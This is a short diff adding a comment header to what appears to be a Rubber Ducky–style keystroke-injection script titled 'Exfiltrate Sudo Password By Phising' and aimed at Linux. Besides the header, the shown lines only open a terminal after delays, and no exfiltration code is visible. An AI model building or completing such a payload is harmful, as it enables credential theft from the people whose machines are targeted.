@@ -1,3 +1,13 @@
+REM ###########################################################
+REM #                                                         |
+REM # Title        : Exfiltrate Sudo Password By Phising      |
+REM # Author       : Zenin                                    |
+REM # Version      : 1.0                                      |
+REM # Category     : Credentials, Phishing                    |
+REM # Target       : Linux                                    |
+REM #                                                         |
+REM ###########################################################
+
 DELAY 1000
 CTRL-ALT t
 DELAY 2000
